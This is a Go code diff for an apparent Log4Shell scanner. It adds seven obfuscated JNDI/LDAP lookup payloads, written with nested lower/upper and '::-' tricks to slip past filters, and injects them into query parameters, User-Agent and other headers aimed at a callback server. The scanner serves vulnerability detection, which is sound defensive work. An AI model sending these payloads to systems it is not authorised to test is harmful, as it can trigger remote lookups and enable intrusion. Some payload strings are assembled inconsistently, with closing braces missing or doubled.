@@ -12,8 +12,6 @@ import (
 
 	"github.com/pterm/pterm"
 	log "github.com/sirupsen/logrus"
-
-	"log4jScanner/utils"
 )
 
 func ScanIP(hostUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan string) {
@@ -31,42 +29,59 @@ func ScanIP(hostUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan s
 	}
 
 	log.Debugf("Target URL: %s", hostUrl)
-	baseUrl, err := url.Parse(hostUrl)
-	param := url.Values{}
-	targetUrl := baseUrl.String()
+        var payloads = []string{
+                "${jndi:ldap://",
+                "${${::-j}ndi:ldap://",
+                "${${lower:jndi}:${lower:ldap}://",
+                "${${lower:${lower:jndi}}:${lower:ldap}://",
+                "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://",
+                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://",
+                "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}${lower:p}}://",
+        }
+        for _, payload := range payloads {
 
-	hintStr := fmt.Sprintf("Profero-log4jScanner-%s", utils.Version)
-	//hintB64 := base64.StdEncoding.EncodeToString([]byte(hintStr))
-	traceHint := fmt.Sprintf("%s_%s/%s", baseUrl.Hostname(), baseUrl.Port(), hintStr)
-	//traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())
+                baseUrl, err := url.Parse(hostUrl)
+                param := url.Values{}
+                // targetUrl := baseUrl.String()
 
-	param.Add("x", fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint))
-	baseUrl.RawQuery = param.Encode()
-	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint)
-	targetHeader := fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint)
-	//log.Debugf("Target User-Agent: %s", targetUserAgent)
-	//log.Debugf("Target X-Api-Version: %s", targetHeader)
-	request, err := http.NewRequest("GET", targetUrl, nil)
-	if err != nil {
-		pterm.Error.Println(err)
-		log.Fatal(err)
-	}
-	request.Header.Set("User-Agent", targetUserAgent)
-	addCommonHeaders(&request.Header,targetHeader)
-	response, err := client.Do(request)
-	if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
-		log.Debug(err)
-	}
-	if response != nil {
-		url := strings.Split(hostUrl, ":")
-		if len(url) != 3 {
-			log.Fatal("Error in response hostUrl parsing:", url)
-		}
-		msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
-		updateCsvRecords(msg)
-		resChan <- msg
-		log.Infof(msg)
-	}
+                // hintStr := "log4jScanner"
+                //hintB64 := base64.StdEncoding.EncodeToString([]byte(hintStr))
+                // traceHint := fmt.Sprintf("%s_%s/%s", baseUrl.Hostname(), baseUrl.Port(), hintStr)
+                traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())
+                //traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())
+
+                // param.Add("x", fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint))
+                param.Add("x", payload + serverUrl + "/" + traceHint)
+                baseUrl.RawQuery = param.Encode()
+                targetUrl := baseUrl.String()
+                // targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint)
+                // targetHeader := fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint)
+                targetUserAgent := payload + serverUrl + "/" + traceHint + "_User-Agent" + "}"
+                targetHeader := payload + serverUrl + "/" + traceHint + "}"
+                //log.Debugf("Target User-Agent: %s", targetUserAgent)
+                //log.Debugf("Target X-Api-Version: %s", targetHeader)
+                request, err := http.NewRequest("GET", targetUrl, nil)
+                if err != nil {
+                        pterm.Error.Println(err)
+                        log.Fatal(err)
+                }
+                request.Header.Set("User-Agent", targetUserAgent)
+                addCommonHeaders(&request.Header,targetHeader)
+                response, err := client.Do(request)
+                if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
+                        log.Debug(err)
+                }
+                if response != nil {
+                        url := strings.Split(hostUrl, ":")
+                        if len(url) != 3 {
+                                log.Fatal("Error in response hostUrl parsing:", url)
+                        }
+                        msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
+                        updateCsvRecords(msg)
+                        resChan <- msg
+                        log.Infof(msg)
+                }
+        }
 }
 
 // GetLocalIP returns the non loopback local IP of the host
